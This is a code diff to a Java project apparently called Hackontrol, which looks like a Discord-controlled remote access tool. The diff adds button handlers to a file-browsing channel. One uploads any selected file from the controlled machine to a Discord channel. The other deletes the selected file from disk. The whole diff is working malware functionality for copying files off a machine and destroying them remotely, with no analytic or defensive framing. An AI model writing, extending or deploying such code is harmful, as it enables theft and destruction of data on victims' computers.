@@ -14,6 +14,7 @@ import com.khopan.hackontrol.manager.common.IReplyHandler;
 import com.khopan.hackontrol.manager.modal.ModalContext;
 import com.khopan.hackontrol.manager.modal.ModalManager;
 import com.khopan.hackontrol.registry.Registry;
+import com.khopan.hackontrol.utils.DiscordUtils;
 import com.khopan.hackontrol.utils.ErrorUtils;
 
 import net.dv8tion.jda.api.entities.channel.middleman.MessageChannel;
@@ -26,6 +27,7 @@ import net.dv8tion.jda.api.interactions.modals.Modal;
 import net.dv8tion.jda.api.interactions.modals.ModalMapping;
 import net.dv8tion.jda.api.requests.restaction.MessageCreateAction;
 import net.dv8tion.jda.api.requests.restaction.interactions.ReplyCallbackAction;
+import net.dv8tion.jda.api.utils.FileUpload;
 import net.dv8tion.jda.api.utils.messages.MessageCreateRequest;
 
 public class FileChannel extends HackontrolChannel {
@@ -96,7 +98,31 @@ public class FileChannel extends HackontrolChannel {
 		}
 
 		FileEntry entry = this.fileList.get(index - 1);
-		FileEmbedSender.reply(entry.file, context.getEvent());
+		File file = entry.file;
+		FileEmbedSender.reply(file, context.getEvent(), buttonContext -> this.downloadFile(file, buttonContext), buttonContext -> this.deleteFile(file, buttonContext));
+	}
+
+	private void downloadFile(File file, ButtonContext context) {
+		if(!file.exists()) {
+			DiscordUtils.selfDeleteMessage(context.reply(), "File '" + file.getAbsolutePath() + "' does not exist");
+			return;
+		}
+
+		context.replyFiles(FileUpload.fromData(file, file.getName())).queue();
+	}
+
+	private void deleteFile(File file, ButtonContext context) {
+		if(!file.exists()) {
+			DiscordUtils.selfDeleteMessage(context.reply(), "File '" + file.getAbsolutePath() + "' does not exist");
+			return;
+		}
+
+		if(!file.delete()) {
+			DiscordUtils.selfDeleteMessage(context.reply(), "Error while deleting a file");
+			return;
+		}
+
+		context.delete();
 	}
 
 	private void modalCallbackGoInto(ModalContext context) {
